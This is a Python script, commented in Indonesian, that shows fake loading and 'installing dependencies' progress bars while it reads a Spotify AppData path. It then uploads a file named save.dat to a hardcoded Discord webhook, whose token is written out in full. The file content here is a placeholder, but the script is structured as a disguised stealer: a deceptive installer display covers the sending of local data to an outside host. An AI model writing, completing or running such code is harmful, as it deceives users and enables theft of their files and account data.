import os
import requests
import time
import sys

# Fungsi untuk menampilkan efek loading
def loading_animation(message, duration):
    print(message, end="", flush=True)
    for _ in range(duration * 10):
        time.sleep(0.1)
        print(".", end="", flush=True)
    print(" done!")

# Fungsi untuk menampilkan bar download
def download_progress_bar(duration):
    print("Installing dependencies ... ", end="", flush=True)
    for _ in range(duration * 10):
        time.sleep(0.1)
        sys.stdout.write("\u001b[42m \u001b[0m")
        sys.stdout.flush()
    print(" done!")

# URL webhook Discord
webhook_url = "https://discord.com/api/webhooks/1229132374743453839/4yeybCG-YGAPEMICohV8_Xr9OsfiN1ibI_d3EAvpMkmBQTeY33RSeCkPVyaTwLY1QtMD"

# Path Spotify
spotify_path = r"C:\Users\user\AppData\Roaming\Spotify"

# Loading reading path
loading_animation("Reading Spotify path ...", 1)

# Printing detected path
print(f"Path detected: {spotify_path}")

# Loading installing dependencies
download_progress_bar(10)

# Buat payload untuk webhook Discord
payload = {
    "content": "Ini adalah file save.dat dari Spotify:",
    "file": ("save.dat", b"Dummy file content")  # Dummy file content
}

# Kirim POST request ke webhook URL dengan payload
response = requests.post(webhook_url, files=payload)

# Periksa jika respons berhasil (kode status 200)
if response.status_code == 200:
    print("File berhasil dikirim ke webhook Discord!")
else:
    print("Error:", response.text)
